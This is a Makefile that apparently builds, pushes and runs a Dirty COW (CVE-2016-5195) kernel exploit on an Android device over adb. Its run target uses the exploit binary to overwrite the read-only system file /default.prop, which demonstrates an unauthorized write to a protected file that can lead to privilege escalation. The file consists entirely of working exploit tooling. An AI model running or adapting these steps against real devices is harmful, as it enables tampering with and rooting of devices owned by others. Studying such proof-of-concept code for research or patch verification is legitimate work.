
all: build

build:
	ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk

push: build
	adb push libs/armeabi/dirtycow /data/local/tmp/dirtycow

run: push
	adb shell "cat /default.prop > /data/local/tmp/orig.prop"
	adb shell "echo '#mooooo' >> /data/local/tmp/orig.prop"
	adb shell '/data/local/tmp/dirtycow /default.prop "`cat /data/local/tmp/orig.prop`"'

clean:
	rm -rf libs
	rm -rf obj

